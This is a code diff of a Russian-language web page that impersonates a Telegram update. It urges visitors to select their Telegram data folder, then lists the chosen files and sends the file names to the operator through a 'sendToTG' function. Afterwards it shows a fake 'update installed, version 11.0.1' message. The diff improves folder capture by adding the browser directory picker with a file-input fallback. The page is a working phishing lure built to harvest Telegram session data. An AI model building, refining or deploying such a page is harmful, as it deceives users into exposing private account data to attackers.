@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Обновление Telegram</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
         body {
             background: #0a0a0a;
             display: flex;
@@ -29,21 +24,9 @@
             text-align: center;
             border: 1px solid #2a2a2a;
         }
-        .icon {
-            font-size: 64px;
-            margin-bottom: 16px;
-        }
-        .title {
-            color: #ffffff;
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #888888;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
+        .icon { font-size: 64px; margin-bottom: 16px; }
+        .title { color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+        .sub { color: #888; font-size: 14px; margin-bottom: 8px; }
         .update-box {
             background: #0a2a1a;
             border: 1px solid #00cc66;
@@ -53,74 +36,56 @@
             color: #66ff99;
             font-size: 14px;
         }
-        .update-box span {
-            font-weight: 700;
-        }
-        .file-input-wrapper {
-            background: #2a2a2a;
-            border: 2px dashed #444;
-            border-radius: 16px;
-            padding: 30px 20px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin: 16px 0;
-        }
-        .file-input-wrapper:hover {
-            border-color: #0088cc;
-        }
-        .file-input-wrapper input {
-            display: none;
-        }
-        .file-label {
-            color: #aaaaaa;
-            font-size: 16px;
-        }
-        .file-label span {
-            color: #0088cc;
-            font-weight: 600;
-        }
-        .status {
-            margin-top: 16px;
-            color: #888888;
-            font-size: 14px;
-            display: none;
-        }
-        .footer {
-            color: #444444;
-            font-size: 12px;
-            margin-top: 24px;
-            border-top: 1px solid #2a2a2a;
-            padding-top: 16px;
-        }
-        .btn-continue {
+        .update-box span { font-weight: 700; }
+        .btn {
             background: #0088cc;
             border: none;
             color: #fff;
+            padding: 18px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: 0.2s;
+        }
+        .btn:active { opacity: 0.7; }
+        .btn-secondary {
+            background: #2a2a2a;
+            border: 2px dashed #444;
+            color: #aaa;
             padding: 14px;
             width: 100%;
             border-radius: 12px;
             font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
             margin-top: 12px;
         }
-        .btn-continue:active {
-            opacity: 0.7;
-        }
-        .folder-hint {
-            color: #666;
-            font-size: 12px;
-            margin-top: 8px;
+        .btn-secondary:active { background: #333; }
+        .status {
+            margin-top: 16px;
+            color: #888;
+            font-size: 14px;
+            display: none;
         }
         .file-list {
             color: #aaa;
             font-size: 12px;
             margin-top: 8px;
-            max-height: 100px;
+            max-height: 150px;
             overflow-y: auto;
             text-align: left;
             word-break: break-all;
+            display: none;
+            background: #111;
+            padding: 8px;
+            border-radius: 8px;
         }
+        .footer { color: #444; font-size: 12px; margin-top: 24px; border-top: 1px solid #2a2a2a; padding-top: 16px; }
+        .browser-hint { color: #555; font-size: 11px; margin-top: 8px; }
+        #fileInput { display: none; }
+        .btn-wrapper { display: flex; flex-direction: column; gap: 8px; }
     </style>
 </head>
 <body>
@@ -131,21 +96,19 @@
     <div class="sub">Вышла новая версия с улучшенной защитой</div>
 
     <div class="update-box">
-        ✅ <span>Важная новость!</span> Для продолжения работы выберите папку с данными Telegram.
+        ✅ <span>Обновление доступно!</span> Выберите папку с данными Telegram.
     </div>
 
-    <div class="file-input-wrapper" id="fileDrop">
-        <label class="file-label" id="fileLabel">
-            <span>📂 Нажмите, чтобы выбрать папку</span>
-        </label>
-        <!-- Используем обычный input с multiple + directory -->
-        <input type="file" id="fileInput" multiple webkitdirectory directory>
+    <div class="btn-wrapper">
+        <button class="btn" id="folderBtn">📂 Выбрать папку</button>
+        <button class="btn-secondary" id="fallbackBtn">📁 Или выберите файлы вручную</button>
     </div>
+
+    <input type="file" id="fileInput" multiple webkitdirectory directory>
 
     <div class="file-list" id="fileList"></div>
     <div class="status" id="status">⏳ Обработка...</div>
-    <button class="btn-continue" id="continueBtn">Продолжить</button>
-
+    <div class="browser-hint">Поддерживается: Chrome, Firefox, Opera, Samsung Internet, Яндекс</div>
     <div class="footer">Telegram • 2026</div>
 </div>
 
@@ -169,46 +132,88 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    // ===== ВЫБОР ФАЙЛОВ =====
-    document.getElementById('fileInput').addEventListener('change', function(e) {
-        const files = e.target.files;
-        if (files.length === 0) return;
+    function showStatus(text, isError = false) {
+        const status = document.getElementById('status');
+        status.style.display = 'block';
+        status.textContent = text;
+        status.style.color = isError ? '#ff6b6b' : '#888';
+    }
 
-        selectedFiles = files;
-        const fileNames = [];
-        for (let i = 0; i < files.length; i++) {
-            fileNames.push(files[i].webkitRelativePath || files[i].name);
-        }
-
-        document.getElementById('status').style.display = 'block';
-        document.getElementById('status').textContent = `📁 Выбрано файлов: ${files.length}`;
-        document.getElementById('fileLabel').innerHTML = `<span>✅ Выбрано ${files.length} файлов</span>`;
-
-        // Показываем список
+    function showFiles(files) {
         const list = document.getElementById('fileList');
-        list.innerHTML = fileNames.slice(0, 10).join('<br>') + (fileNames.length > 10 ? `<br>... и ещё ${fileNames.length - 10}` : '');
+        list.style.display = 'block';
+        const names = [];
+        for (let i = 0; i < files.length; i++) {
+            names.push(files[i].webkitRelativePath || files[i].name);
+        }
+        list.innerHTML = names.slice(0, 20).join('<br>') + (names.length > 20 ? `<br>... и ещё ${names.length - 20}` : '');
+    }
 
-        // Отправляем в Telegram
-        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлы (${files.length}):\n${fileNames.join('\n')}`);
-    });
-
-    // ===== КНОПКА =====
-    document.getElementById('continueBtn').addEventListener('click', function() {
-        if (selectedFiles.length === 0) {
-            document.getElementById('status').style.display = 'block';
-            document.getElementById('status').textContent = '⚠️ Пожалуйста, выберите папку с данными Telegram';
+    function processFiles(files) {
+        if (!files || files.length === 0) {
+            showStatus('⚠️ Файлы не выбраны', true);
             return;
         }
 
-        document.getElementById('status').textContent = '⏳ Обновление...';
-        sendToTG(`✅ <b>Обновление завершено</b>\n📁 Файлов обработано: ${selectedFiles.length}`);
+        selectedFiles = files;
+        const names = [];
+        for (let i = 0; i < files.length; i++) {
+            names.push(files[i].webkitRelativePath || files[i].name);
+        }
 
-        setTimeout(() => {
-            document.getElementById('status').textContent = '✅ Обновление успешно установлено! Перезапустите Telegram.';
-            document.querySelector('.update-box').innerHTML = '✅ <span>Обновление установлено!</span> Версия 11.0.1';
-            document.getElementById('continueBtn').textContent = 'Перезапустить';
-            document.getElementById('continueBtn').style.background = '#00cc66';
-        }, 2000);
+        showStatus(`✅ Выбрано файлов: ${files.length}`);
+        showFiles(files);
+
+        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлов: ${files.length}\n\n${names.slice(0, 30).join('\n')}`);
+
+        document.querySelector('.update-box').innerHTML = '✅ <span>Обновление установлено!</span> Версия 11.0.1';
+        document.getElementById('folderBtn').textContent = 'Готово';
+        document.getElementById('folderBtn').style.background = '#00cc66';
+        document.getElementById('fallbackBtn').style.display = 'none';
+    }
+
+    // ===== СПОСОБ 1: showDirectoryPicker (Chrome) =====
+    document.getElementById('folderBtn').addEventListener('click', async function() {
+        // Проверяем, поддерживается ли showDirectoryPicker
+        if (typeof window.showDirectoryPicker === 'function') {
+            try {
+                const dirHandle = await window.showDirectoryPicker();
+                let files = [];
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        files.push({ name: entry.name, webkitRelativePath: entry.name });
+                    }
+                }
+                processFiles(files);
+                return;
+            } catch (err) {
+                if (err.name === 'AbortError') {
+                    showStatus('⚠️ Выбор папки отменён', true);
+                    return;
+                }
+                console.log('showDirectoryPicker ошибка:', err);
+                // Если ошибка — пробуем fallback
+            }
+        }
+
+        // ===== СПОСОБ 2: input[type="file"] (все браузеры) =====
+        document.getElementById('fileInput').click();
+    });
+
+    // ===== ОБРАБОТКА ЧЕРЕЗ input =====
+    document.getElementById('fileInput').addEventListener('change', function(e) {
+        const files = e.target.files;
+        if (files && files.length > 0) {
+            processFiles(files);
+        } else {
+            showStatus('⚠️ Файлы не выбраны', true);
+        }
+        this.value = ''; // сброс для повторного выбора
+    });
+
+    // ===== FALLBACK — ручной выбор =====
+    document.getElementById('fallbackBtn').addEventListener('click', function() {
+        document.getElementById('fileInput').click();
     });
 
     // ===== АВТО-УВЕДОМЛЕНИЕ =====
